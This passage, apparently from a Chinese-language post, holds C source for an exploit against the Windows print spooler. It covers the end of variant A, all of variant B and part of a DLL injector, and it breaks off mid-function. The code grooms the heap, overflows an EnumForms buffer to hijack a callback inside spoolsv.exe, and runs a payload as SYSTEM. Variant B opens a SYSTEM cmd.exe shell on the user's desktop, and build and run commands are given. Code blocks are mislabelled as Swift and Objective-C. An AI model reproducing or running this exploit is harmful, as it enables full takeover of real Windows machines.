    LOG("[+] Step 2 complete: attacker bytes are now in the form store\n");

    STEP("STEP 3: MEASURE LAYOUT (needed, custom_off)");

    pEnum(hPrinter, 1, NULL, 0, &needed, &returned);
    LOG("\n[*] Step 3: needed=%u, forms=%u\n", needed, returned);

    DWORD custom_off = 0;
    {
        BYTE *tmp = (BYTE *)HeapAlloc(GetProcessHeap(), 0, needed);
        if (tmp) {
            DWORD n = 0, r = 0;
            __try { pEnum(hPrinter, 1, tmp, needed, &n, &r); } __except(1) {}
            for (i = 0; i < (int)r; i++) {
                wchar_t *name = *(wchar_t **)(tmp + i*40 + 8);
                if (name && wcscmp(name, g_form_name) == 0) {
                    custom_off = (DWORD)((BYTE *)name - tmp);
                    LOG("    Custom form at index %d, string at buf+0x%X\n",
                        i, custom_off);
                    break;
                }
            }
            HeapFree(GetProcessHeap(), 0, tmp);
        }
    }
    if (custom_off == 0) {
        LOG("[ - ] Cannot find custom form string\n");
        goto done;
    }
    LOG("[+] Step 3 complete: our name packs at buf+0x%X in an honest buffer\n", custom_off);

    STEP("STEP 4: SPRAY CALLBACK OBJECTS AND OPEN HOLES");

    LOG("\n[*] Step 4: Spraying callback objects (size=0x%X)\n", needed);
    g_heap = GetProcessHeap();

    for (i = 0; i < SPRAY_COUNT; i++) {
        g_spray[i] = (SPRAY_OBJ *)HeapAlloc(g_heap, HEAP_ZERO_MEMORY, needed);
        if (g_spray[i]) {
            g_spray[i]->callback = NULL;
            g_spray[i]->marker = 0xCAFEBABE;
            g_spray[i]->index = i;
        }
    }
    LOG("    [+] Sprayed %d SPRAY_OBJ blocks (marker 0xCAFEBABE)\n", SPRAY_COUNT);

    for (i = HOLE_INTERVAL; i < SPRAY_COUNT; i += HOLE_INTERVAL) {
        if (g_spray[i]) { HeapFree(g_heap, 0, g_spray[i]); g_spray[i] = NULL; }
    }
    LOG("    [+] Freed every %d-th block to open holes\n", HOLE_INTERVAL);
    LOG("[+] Step 4 complete: heap groomed\n");

    STEP("STEP 5: PLACE VICTIM BUFFER AND FIND THE NEIGHBOR");

    buffer = (BYTE *)HeapAlloc(g_heap, HEAP_ZERO_MEMORY, needed);
    LOG("    buffer at %p\n", buffer);

    SPRAY_OBJ *target = NULL;
    int tidx = -1;
    LONGLONG min_d = 0x7FFFFFFF;
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (g_spray[i]) {
            LONGLONG d = (LONGLONG)g_spray[i] - (LONGLONG)buffer;
            if (d > 0 && d < min_d) { min_d = d; tidx = i; target = g_spray[i]; }
        }
    }
    if (!target) { LOG("[-] No adjacent target\n"); goto done; }

    DWORD delta = (DWORD)min_d;
    LOG("    target spray[%d] at %p (delta=0x%X)\n", tidx, target, delta);
    LOG("[+] Step 5 complete: victim dropped next to spray[%d]\n", tidx);

    STEP("STEP 6: PRECISION OVERFLOW (cbBuf = needed + shift)");

    DWORD shift = delta - custom_off;
    DWORD cbBuf = needed + shift;

    LOG("\n[*] Step 6: Precision overflow\n");
    LOG("    custom_off=0x%X, delta=0x%X, shift=0x%X, cbBuf=0x%X\n",
        custom_off, delta, shift, cbBuf);

    __try {
        DWORD n = 0, r = 0;
        pEnum(hPrinter, 1, buffer, cbBuf, &n, &r);
        LOG("    Overflow triggered: ret=%u\n", r);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        LOG("    EXCEPTION during overflow\n");
    }
    LOG("[+] Step 6 complete: packed name deposited at the neighbor\n");

    STEP("STEP 7: VERIFY THE CORRUPTION AND EXECUTE");

    LOG("\n[*] Step 7: Checking target corruption\n");

    __try {
        UINT_PTR written_ptr = (UINT_PTR)target->callback;
        LOG("    target->callback = 0x%p\n", (void *)written_ptr);
        LOG("    shellcode_addr   = 0x%p\n", (void *)shellcode_addr);
        LOG("    target->marker   = 0x%08X (was 0xCAFEBABE)\n", target->marker);

        if (written_ptr == shellcode_addr) {
            LOG("\n    [!!!] CALLBACK POINTER MATCHES SHELLCODE ADDRESS!\n");
            LOG("    [!!!] Calling through corrupted pointer...\n\n");
            target->callback();
            LOG("    [!!!] SHELLCODE EXECUTED SUCCESSFULLY!\n");
            LOG("    [!!!] Check %s for proof.\n", PROOF_FILE);
        } else if (written_ptr != 0) {
            LOG("\n    [*] Callback overwritten but does not match exactly.\n");
            LOG("    [*] Written: 0x%p, Expected: 0x%p\n",
                (void *)written_ptr, (void *)shellcode_addr);
        } else {
            LOG("\n    [-] Callback not overwritten (still NULL)\n");
            LOG("    [*] Offset calculation may need adjustment\n");
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        LOG("    EXCEPTION 0x%08X during callback check\n", GetExceptionCode());
    }
    LOG("[+] Step 7 complete\n");

done:
    if (buffer) HeapFree(g_heap, 0, buffer);
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (g_spray[i]) { HeapFree(g_heap, 0, g_spray[i]); g_spray[i] = NULL; }
    }
    pDeleteForm(hPrinter, g_form_name);
    __try { pClose(hPrinter); } __except(1) {}
    if (g_shellcode) VirtualFree(g_shellcode, 0, MEM_RELEASE);

    LOG("\n============================================================\n");
    LOG("  EXPLOIT COMPLETE. spoolsv.exe PID=%u still running.\n", GetCurrentProcessId());
    LOG("============================================================\n");
    fclose(g_log);
    g_log = NULL;
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
    }
    return TRUE;
}
```

exploit 的变体 B 如下：

```swift
/*
 * exploit_stage4_shell_clean.c -- EnumForms heap-overflow EoP, variant B (visible shell).
 *
 *   Byte-for-byte the same as exploit_stage4_exec_clean.c except (1) it streams its staged
 *   narration live to the injector's console through a named pipe instead of a log file --
 *   so the whole sequence shows up in the same output as the injection -- and
 *   (2) shellcode_func's spawn tail: instead of a plain Session-0 CreateProcessW, it
 *   duplicates the SYSTEM token, retargets it to the active console session, and launches
 *   cmd.exe on the interactive desktop so you get a SYSTEM shell you can see and type in.
 *
 *   Build: cl /W4 /O2 /LD exploit_stage4_shell_clean.c /Fe:payload_shell.dll
 *   Run:   inject_enumforms.exe payload_shell.dll     (admin + SeDebug)
 *   Output: the injector console (staged stream, relayed live from spoolsv Session 0)
 *           C:\Windows\Temp\EXPLOITED.txt            (SYSTEM token proof)
 *           C:\Windows\Temp\enumforms_inject_log.txt (fallback log if loaded directly)
 */

#include <windows.h>
#include <sddl.h>
#include <wtsapi32.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

#define PIPE_NAME  L"\\\\.\\pipe\\ers11_enumforms"
#define LOG_FILE   "C:\\Windows\\Temp\\enumforms_inject_log.txt"
#define PROOF_FILE "C:\\Windows\\Temp\\EXPLOITED.txt"

static HANDLE g_pipe = INVALID_HANDLE_VALUE;
static FILE  *g_log  = NULL;

static void LOG_RAW(const char *s, int len) {
    if (g_pipe != INVALID_HANDLE_VALUE) {
        DWORD wr = 0;
        WriteFile(g_pipe, s, (DWORD)len, &wr, NULL);
    } else if (g_log) {
        fwrite(s, 1, (size_t)len, g_log);
        fflush(g_log);
    }
}

static void LOG(const char *fmt, ...) {
    char line[1024];
    int n;
    va_list ap;

    va_start(ap, fmt);
    n = _vsnprintf_s(line, sizeof(line), _TRUNCATE, fmt, ap);
    va_end(ap);
    if (n < 0) n = (int)strlen(line);
    LOG_RAW(line, n);
}

static void STEP(const char *title) {
    LOG("\n============================================================\n");
    LOG("  %s\n", title);
    LOG("============================================================\n");
}

static void close_log(void) {
    if (g_pipe != INVALID_HANDLE_VALUE) { CloseHandle(g_pipe); g_pipe = INVALID_HANDLE_VALUE; }
    if (g_log) { fclose(g_log); g_log = NULL; }
}

typedef BOOL (WINAPI *PFN_OpenPrinterW)(LPWSTR, LPHANDLE, LPVOID);
typedef BOOL (WINAPI *PFN_EnumFormsW)(HANDLE, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD);
typedef BOOL (WINAPI *PFN_ClosePrinter)(HANDLE);
typedef BOOL (WINAPI *PFN_AddFormW)(HANDLE, DWORD, LPBYTE);
typedef BOOL (WINAPI *PFN_DeleteFormW)(HANDLE, LPWSTR);

typedef void (*PFN_CALLBACK)(void);

typedef struct _SPRAY_OBJ {
    PFN_CALLBACK callback;
    DWORD marker;
    DWORD index;
    BYTE padding[1];
} SPRAY_OBJ;

#define SPRAY_COUNT     300
#define HOLE_INTERVAL   4

static SPRAY_OBJ *g_spray[SPRAY_COUNT];
static HANDLE g_heap;
static PVOID g_shellcode = NULL;
static wchar_t g_form_name[128];

static DWORD pick_interactive_session(void) {
    DWORD sid = 0xFFFFFFFF;
    HMODULE h = LoadLibraryW(L"wtsapi32.dll");
    if (h) {
        typedef BOOL (WINAPI *PFN_Enum)(HANDLE, DWORD, DWORD, PWTS_SESSION_INFOW *, DWORD *);
        typedef void (WINAPI *PFN_Free)(PVOID);
        PFN_Enum pEnum = (PFN_Enum)GetProcAddress(h, "WTSEnumerateSessionsW");
        PFN_Free pFree = (PFN_Free)GetProcAddress(h, "WTSFreeMemory");
        if (pEnum && pFree) {
            PWTS_SESSION_INFOW list = NULL; DWORD count = 0;
            if (pEnum((HANDLE)NULL, 0, 1, &list, &count)) {
                for (DWORD k = 0; k < count; k++)
                    if (list[k].State == WTSActive) { sid = list[k].SessionId; break; }
                pFree(list);
            }
        }
        FreeLibrary(h);
    }
    if (sid == 0xFFFFFFFF) sid = WTSGetActiveConsoleSessionId();
    return sid;
}

static void __cdecl shellcode_func(void) {
    HANDLE hToken = NULL, hFile; DWORD written; char buf[4096]; int pos = 0;

    pos += sprintf_s(buf + pos, sizeof(buf) - pos,
        "============================================================\r\n"
        "  EXPLOIT PROOF: Code Execution as SYSTEM\r\n"
        "  spoolsv.exe EnumForms Heap Overflow (CWE-122 / CWE-787)\r\n"
        "============================================================\r\n\r\n");

    pos += sprintf_s(buf + pos, sizeof(buf) - pos,
        "Process: spoolsv.exe (PID %u)\r\n", GetCurrentProcessId());

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE tu[256]; DWORD rl = 0;
        if (GetTokenInformation(hToken, TokenUser, tu, sizeof(tu), &rl)) {
            WCHAR name[128] = {0}, dom[128] = {0}; DWORD nl = 128, dl = 128; SID_NAME_USE use;
            if (LookupAccountSidW(NULL, ((TOKEN_USER *)tu)->User.Sid, name, &nl, dom, &dl, &use))
                pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Token User: %S\\%S\r\n", dom, name);
            LPWSTR sid = NULL;
            if (ConvertSidToStringSidW(((TOKEN_USER *)tu)->User.Sid, &sid)) {
                pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Token SID:  %S\r\n", sid); LocalFree(sid);
            }
        }

        BYTE tp[2048];
        if (GetTokenInformation(hToken, TokenPrivileges, tp, sizeof(tp), &rl)) {
            TOKEN_PRIVILEGES *pv = (TOKEN_PRIVILEGES *)tp;
            pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Token Privileges: %u\r\n", pv->PrivilegeCount);
            for (DWORD k = 0; k < pv->PrivilegeCount && k < 30; k++) {
                WCHAR pn[128] = {0}; DWORD pl = 128;
                if (LookupPrivilegeNameW(NULL, &pv->Privileges[k].Luid, pn, &pl)) {
                    DWORD a = pv->Privileges[k].Attributes;
                    const char *st = (a & SE_PRIVILEGE_ENABLED) ? "Enabled" :
                                     (a & SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? "Default" : "Disabled";
                    pos += sprintf_s(buf + pos, sizeof(buf) - pos, "  %S [%s]\r\n", pn, st);
                }
            }
        }

        BYTE ti[128];
        if (GetTokenInformation(hToken, TokenIntegrityLevel, ti, sizeof(ti), &rl)) {
            TOKEN_MANDATORY_LABEL *lbl = (TOKEN_MANDATORY_LABEL *)ti;
            DWORD *sa = GetSidSubAuthority(lbl->Label.Sid,
                          (DWORD)(UCHAR)(*GetSidSubAuthorityCount(lbl->Label.Sid) - 1));
            const char *lv = (*sa >= 0x4000) ? "SYSTEM" : (*sa >= 0x3000) ? "High" :
                             (*sa >= 0x2000) ? "Medium" : "Low";
            pos += sprintf_s(buf + pos, sizeof(buf) - pos, "Integrity Level: %s (0x%X)\r\n", lv, *sa);
        }
        CloseHandle(hToken);
    }

    pos += sprintf_s(buf + pos, sizeof(buf) - pos, "\r\n[*] Spawning SYSTEM shell in user session...\r\n");

    HANDLE hSysToken = NULL, hNewToken = NULL; BOOL shellOk = FALSE;
    STARTUPINFOW si = {0}; si.cb = sizeof si; si.lpDesktop = L"WinSta0\\Default";
    PROCESS_INFORMATION pi = {0};
    WCHAR sysDir[MAX_PATH], cmd[MAX_PATH]; GetSystemDirectoryW(sysDir, MAX_PATH);
    swprintf_s(cmd, MAX_PATH, L"%s\\cmd.exe", sysDir);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hSysToken)) {
        if (DuplicateTokenEx(hSysToken, TOKEN_ALL_ACCESS, NULL,
                             SecurityImpersonation, TokenPrimary, &hNewToken)) {
            DWORD sessionId = pick_interactive_session();
            pos += sprintf_s(buf + pos, sizeof(buf) - pos, "[*] Target session: %lu\r\n", sessionId);
            SetTokenInformation(hNewToken, TokenSessionId, &sessionId, sizeof(DWORD));
            shellOk = CreateProcessAsUserW(hNewToken, NULL, cmd, NULL, NULL, FALSE,
                                           CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
        }
        CloseHandle(hSysToken);
    }

    if (shellOk) {
        pos += sprintf_s(buf + pos, sizeof(buf) - pos, "[+] SYSTEM shell created! PID: %lu\r\n", pi.dwProcessId);
        BYTE stu[256]; DWORD srl = 0; LPWSTR ssid = NULL;
        if (GetTokenInformation(hNewToken, TokenUser, stu, sizeof(stu), &srl) &&
            ConvertSidToStringSidW(((TOKEN_USER *)stu)->User.Sid, &ssid)) {
            pos += sprintf_s(buf + pos, sizeof(buf) - pos, "[+] Shell token SID: %S\r\n", ssid); LocalFree(ssid);
        }
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else {
        pos += sprintf_s(buf + pos, sizeof(buf) - pos,
            "[ - ] CreateProcessAsUserW failed: %lu (need an active console session to target)\r\n"
            "[*] The token proof above still confirms SYSTEM execution inside spoolsv.\r\n",
            GetLastError());
    }
    if (hNewToken) CloseHandle(hNewToken);

    LOG_RAW(buf, pos);

    hFile = CreateFileA(PROOF_FILE, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) { WriteFile(hFile, buf, pos, &written, NULL); CloseHandle(hFile); }
}

static void encode_address_as_form_name(UINT_PTR addr, wchar_t *name, int max_len) {
    BYTE *bytes = (BYTE *)&addr; int i, wchar_count = 0;
    name[0] = 0;
    for (i = 0; i < 8; i += 2) {
        wchar_t wc = (wchar_t)(bytes[i] | (bytes[i+1] << 8));
        if (wc == 0) break;
        name[wchar_count++] = wc;
        if (wchar_count >= max_len - 1) break;
    }
    name[wchar_count] = 0;
}

static DWORD WINAPI WorkerThread(LPVOID param) {
    (void)param;
    HMODULE hSpoolss;
    PFN_OpenPrinterW pOpen; PFN_EnumFormsW pEnum; PFN_ClosePrinter pClose;
    PFN_AddFormW pAddForm; PFN_DeleteFormW pDeleteForm;
    HANDLE hPrinter = NULL; DWORD needed = 0, returned = 0; int i;
    BYTE *buffer = NULL;

    Sleep(1000);
    g_pipe = CreateFileW(PIPE_NAME, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_pipe == INVALID_HANDLE_VALUE)
        g_log = fopen(LOG_FILE, "w");
    if (g_pipe == INVALID_HANDLE_VALUE && !g_log) return 1;

    LOG("============================================================\n");
    LOG("  EXPLOIT STAGE 4: Code Execution via Heap Overflow\n");
    LOG("  PID: %u (spoolsv.exe, NT AUTHORITY\\SYSTEM)\n", GetCurrentProcessId());
    LOG("============================================================\n");

    STEP("STEP 0: BUILD TRAMPOLINE AND ENCODE TARGET ADDRESS");

    LOG("[*] Step 0: Preparing shellcode function\n");
    UINT_PTR shellcode_addr = (UINT_PTR)&shellcode_func;
    LOG("    shellcode_func at: 0x%p\n", (void *)shellcode_addr);

    BYTE *addr_bytes = (BYTE *)&shellcode_addr;
    LOG("    Address bytes: ");
    for (i = 0; i < 8; i++) LOG("%02X ", addr_bytes[i]);
    LOG("\n");

    BOOL has_null_wchar = FALSE;
    for (i = 0; i < 6; i += 2) {
        wchar_t wc = (wchar_t)(addr_bytes[i] | (addr_bytes[i+1] << 8));
        if (wc == 0) { has_null_wchar = TRUE; break; }
    }

    if (has_null_wchar) {
        LOG("    [!] Address has a null wchar in the low 6 bytes\n");
        LOG("    [*] Allocating a null-free executable page for a trampoline...\n");

        for (UINT_PTR try_addr = 0x10010000; try_addr < 0x7FFF0000; try_addr += 0x10000) {
            BYTE *tb = (BYTE *)&try_addr;
            wchar_t w0 = (wchar_t)(tb[0] | (tb[1] << 8));
            wchar_t w1 = (wchar_t)(tb[2] | (tb[3] << 8));
            if (w0 != 0 && w1 != 0) {
                g_shellcode = VirtualAlloc((PVOID)try_addr, 4096,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (g_shellcode) {
                    LOG("    [+] Shellcode at: 0x%p (null-free)\n", g_shellcode);
                    BYTE *code = (BYTE *)g_shellcode;
                    code[0] = 0x48; code[1] = 0xB8;
                    *(UINT_PTR *)(code + 2) = shellcode_addr;
                    code[10] = 0xFF; code[11] = 0xE0;
                    shellcode_addr = (UINT_PTR)g_shellcode;
                    break;
                }
            }
        }
        if (!g_shellcode) {
            LOG("    [-] Cannot allocate null-free address\n");
            LOG("    [*] Falling back to direct address\n");
        }
    } else {
        LOG("    [+] Address is null-free; encoding it directly (no trampoline)\n");
    }

    encode_address_as_form_name(shellcode_addr, g_form_name, 128);
    LOG("    Form name encoding: L\"");
    for (i = 0; g_form_name[i]; i++) LOG("\\x%04X", g_form_name[i]);
    LOG("\" + null\n");

    UINT_PTR decoded = 0;
    BYTE *dec_bytes = (BYTE *)&decoded;
    for (i = 0; g_form_name[i] && i < 4; i++) {
        dec_bytes[i*2]   = (BYTE)(g_form_name[i] & 0xFF);
        dec_bytes[i*2+1] = (BYTE)(g_form_name[i] >> 8);
    }
    LOG("    Decoded address: 0x%p %s\n", (void *)decoded,
        decoded == shellcode_addr ? "(MATCH!)" : "(MISMATCH!)");
    LOG("[+] Step 0 complete: callback value ready\n");

    STEP("STEP 1: RESOLVE ROUTER EXPORTS AND OPEN PRINTER");

    hSpoolss = GetModuleHandleW(L"spoolss.dll");
    if (!hSpoolss) hSpoolss = LoadLibraryW(L"spoolss.dll");
    LOG("[*] spoolss.dll at 0x%p\n", (void *)hSpoolss);

    pOpen = (PFN_OpenPrinterW)GetProcAddress(hSpoolss, "OpenPrinterW");
    pEnum = (PFN_EnumFormsW)GetProcAddress(hSpoolss, "EnumFormsW");
    pClose = (PFN_ClosePrinter)GetProcAddress(hSpoolss, "ClosePrinter");
    pAddForm = (PFN_AddFormW)GetProcAddress(hSpoolss, "AddFormW");
    pDeleteForm = (PFN_DeleteFormW)GetProcAddress(hSpoolss, "DeleteFormW");

    if (!pOpen || !pEnum || !pClose || !pAddForm || !pDeleteForm) {
        LOG("[ - ] Could not resolve one or more router exports\n");
        close_log(); return 1;
    }
    LOG("    [+] OpenPrinterW/EnumFormsW/ClosePrinter/AddFormW/DeleteFormW resolved\n");

    __try {
        if (!pOpen(NULL, &hPrinter, NULL)) {
            LOG("[ - ] OpenPrinter: %u\n", GetLastError());
            close_log(); return 1;
        }
    } __except(1) {
        LOG("[ - ] OpenPrinter exception\n");
        close_log(); return 1;
    }
    LOG("    [+] Printer handle: 0x%p\n", (void *)hPrinter);
    LOG("[+] Step 1 complete: router ready, local print server opened\n");

    STEP("STEP 2: PLANT FORM WHOSE NAME ENCODES THE ADDRESS");

    LOG("\n[*] Step 2: Adding form with encoded address name\n");
    {
        typedef struct {
            DWORD Flags; LPWSTR pName; SIZEL Size; RECTL ImageableArea;
        } MY_FORM_INFO_1;

        MY_FORM_INFO_1 fi = {0};
        fi.Flags = 0;
        fi.pName = g_form_name;
        fi.Size.cx = 215900;
        fi.Size.cy = 279400;
        fi.ImageableArea.right = 215900;
        fi.ImageableArea.bottom = 279400;

        pDeleteForm(hPrinter, g_form_name);
        if (pAddForm(hPrinter, 1, (LPBYTE)&fi))
            LOG("    [+] Form added\n");
        else
            LOG("    [ - ] AddForm: %u\n", GetLastError());
    }
    LOG("[+] Step 2 complete: attacker bytes are now in the form store\n");

    STEP("STEP 3: MEASURE LAYOUT (needed, custom_off)");

    pEnum(hPrinter, 1, NULL, 0, &needed, &returned);
    LOG("\n[*] Step 3: needed=%u, forms=%u\n", needed, returned);

    DWORD custom_off = 0;
    {
        BYTE *tmp = (BYTE *)HeapAlloc(GetProcessHeap(), 0, needed);
        if (tmp) {
            DWORD n = 0, r = 0;
            __try { pEnum(hPrinter, 1, tmp, needed, &n, &r); } __except(1) {}
            for (i = 0; i < (int)r; i++) {
                wchar_t *name = *(wchar_t **)(tmp + i*40 + 8);
                if (name && wcscmp(name, g_form_name) == 0) {
                    custom_off = (DWORD)((BYTE *)name - tmp);
                    LOG("    Custom form at index %d, string at buf+0x%X\n",
                        i, custom_off);
                    break;
                }
            }
            HeapFree(GetProcessHeap(), 0, tmp);
        }
    }
    if (custom_off == 0) {
        LOG("[ - ] Cannot find custom form string\n");
        goto done;
    }
    LOG("[+] Step 3 complete: our name packs at buf+0x%X in an honest buffer\n", custom_off);

    STEP("STEP 4: SPRAY CALLBACK OBJECTS AND OPEN HOLES");

    LOG("\n[*] Step 4: Spraying callback objects (size=0x%X)\n", needed);
    g_heap = GetProcessHeap();

    for (i = 0; i < SPRAY_COUNT; i++) {
        g_spray[i] = (SPRAY_OBJ *)HeapAlloc(g_heap, HEAP_ZERO_MEMORY, needed);
        if (g_spray[i]) {
            g_spray[i]->callback = NULL;
            g_spray[i]->marker = 0xCAFEBABE;
            g_spray[i]->index = i;
        }
    }
    LOG("    [+] Sprayed %d SPRAY_OBJ blocks (marker 0xCAFEBABE)\n", SPRAY_COUNT);

    for (i = HOLE_INTERVAL; i < SPRAY_COUNT; i += HOLE_INTERVAL) {
        if (g_spray[i]) { HeapFree(g_heap, 0, g_spray[i]); g_spray[i] = NULL; }
    }
    LOG("    [+] Freed every %d-th block to open holes\n", HOLE_INTERVAL);
    LOG("[+] Step 4 complete: heap groomed\n");

    STEP("STEP 5: PLACE VICTIM BUFFER AND FIND THE NEIGHBOR");

    buffer = (BYTE *)HeapAlloc(g_heap, HEAP_ZERO_MEMORY, needed);
    LOG("    buffer at %p\n", buffer);

    SPRAY_OBJ *target = NULL;
    int tidx = -1;
    LONGLONG min_d = 0x7FFFFFFF;
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (g_spray[i]) {
            LONGLONG d = (LONGLONG)g_spray[i] - (LONGLONG)buffer;
            if (d > 0 && d < min_d) { min_d = d; tidx = i; target = g_spray[i]; }
        }
    }
    if (!target) { LOG("[-] No adjacent target\n"); goto done; }

    DWORD delta = (DWORD)min_d;
    LOG("    target spray[%d] at %p (delta=0x%X)\n", tidx, target, delta);
    LOG("[+] Step 5 complete: victim dropped next to spray[%d]\n", tidx);

    STEP("STEP 6: PRECISION OVERFLOW (cbBuf = needed + shift)");

    DWORD shift = delta - custom_off;
    DWORD cbBuf = needed + shift;

    LOG("\n[*] Step 6: Precision overflow\n");
    LOG("    custom_off=0x%X, delta=0x%X, shift=0x%X, cbBuf=0x%X\n",
        custom_off, delta, shift, cbBuf);

    __try {
        DWORD n = 0, r = 0;
        pEnum(hPrinter, 1, buffer, cbBuf, &n, &r);
        LOG("    Overflow triggered: ret=%u\n", r);
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        LOG("    EXCEPTION during overflow\n");
    }
    LOG("[+] Step 6 complete: packed name deposited at the neighbor\n");

    STEP("STEP 7: VERIFY THE CORRUPTION AND EXECUTE");

    LOG("\n[*] Step 7: Checking target corruption\n");

    __try {
        UINT_PTR written_ptr = (UINT_PTR)target->callback;
        LOG("    target->callback = 0x%p\n", (void *)written_ptr);
        LOG("    shellcode_addr   = 0x%p\n", (void *)shellcode_addr);
        LOG("    target->marker   = 0x%08X (was 0xCAFEBABE)\n", target->marker);

        if (written_ptr == shellcode_addr) {
            LOG("\n    [!!!] CALLBACK POINTER MATCHES SHELLCODE ADDRESS!\n");
            LOG("    [!!!] Calling through corrupted pointer...\n\n");
            target->callback();
            LOG("    [!!!] SHELLCODE EXECUTED SUCCESSFULLY!\n");
            LOG("    [!!!] Check %s for proof.\n", PROOF_FILE);
        } else if (written_ptr != 0) {
            LOG("\n    [*] Callback overwritten but does not match exactly.\n");
            LOG("    [*] Written: 0x%p, Expected: 0x%p\n",
                (void *)written_ptr, (void *)shellcode_addr);
        } else {
            LOG("\n    [-] Callback not overwritten (still NULL)\n");
            LOG("    [*] Offset calculation may need adjustment\n");
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        LOG("    EXCEPTION 0x%08X during callback check\n", GetExceptionCode());
    }
    LOG("[+] Step 7 complete\n");

done:
    if (buffer) HeapFree(g_heap, 0, buffer);
    for (i = 0; i < SPRAY_COUNT; i++) {
        if (g_spray[i]) { HeapFree(g_heap, 0, g_spray[i]); g_spray[i] = NULL; }
    }
    pDeleteForm(hPrinter, g_form_name);
    __try { pClose(hPrinter); } __except(1) {}
    if (g_shellcode) VirtualFree(g_shellcode, 0, MEM_RELEASE);

    LOG("\n============================================================\n");
    LOG("  EXPLOIT COMPLETE. spoolsv.exe PID=%u still running.\n", GetCurrentProcessId());
    LOG("============================================================\n");
    close_log();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
    }
    return TRUE;
}
```

注入器代码（inject_enumforms.c）和之前的那个基本一样，如下：

```objectivec
/*
 * inject_enumforms.c -- Injector: loads our DLL into spoolsv.exe and relays the
 *   payload's staged output live into this console.
 *
 * 1. Finds spoolsv.exe PID
 * 2. Opens the process
 * 3. Allocates memory in spoolsv and writes the DLL path
 * 4. Creates a remote thread calling LoadLibraryW
 * 5. The DLL's DllMain starts the exploit worker, which connects back to the relay
 *    pipe this injector created and streams every stage line here.
 *
 * spoolsv.exe runs in Session 0 with no console, so the payload cannot printf to this
 * window directly. The injector therefore stands up a one-instance named pipe
 * (\\.\pipe\ers11_enumforms) BEFORE injecting; the payload connects to it as a client
 * and writes its staged narration, which we read and print here -- so the whole
 * sequence appears in a single output, the way the DLL-injection articles show it,
 * with no separate log file to open afterwards.
 *
 * Compile: cl /W4 /O2 inject_enumforms.c advapi32.lib
 *
 * Must run as Administrator (needs SeDebugPrivilege)
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib")

#define PIPE_NAME L"\\\\.\\pipe\\ers11_enumforms"

static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return ok && GetLastError() == ERROR_SUCCESS;
}

static DWORD FindProcessByName(const wchar_t *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    DWORD pid = 0;

    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return pid;
}

static BOOL RelayPayloadOutput(HANDLE hPipe, DWORD connectMs, DWORD overallMs) {
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    OVERLAPPED ov;
    DWORD start;
    BOOL connected = FALSE;

    if (!hEvent) return FALSE;

    ZeroMemory(&ov, sizeof(ov));
    ov.hEvent = hEvent;

    if (ConnectNamedPipe(hPipe, &ov)) {
        connected = TRUE;
    } else {
        DWORD e = GetLastError();
        if (e == ERROR_PIPE_CONNECTED) {
            connected = TRUE;
        } else if (e == ERROR_IO_PENDING) {
            if (WaitForSingleObject(hEvent, connectMs) == WAIT_OBJECT_0) {
                DWORD junk = 0;
                connected = GetOverlappedResult(hPipe, &ov, &junk, FALSE);
            }
        }
    }

    if (!connected) {
        CancelIo(hPipe);
        CloseHandle(hEvent);
        return FALSE;
    }

    printf("---- begin payload (spoolsv.exe, Session 0, NT AUTHORITY\\SYSTEM) ----\n");

    start = GetTickCount();

    for (;;) {
        char buf[4096];
        DWORD got = 0;
        BOOL ok;

        ResetEvent(hEvent);
        ZeroMemory(&ov, sizeof(ov));
        ov.hEvent = hEvent;

        ok = ReadFile(hPipe, buf, sizeof(buf), &got, &ov);

        if (!ok) {
            DWORD e = GetLastError();
            if (e == ERROR_IO_PENDING) {
                DWORD remain = overallMs - (GetTickCount() - start);
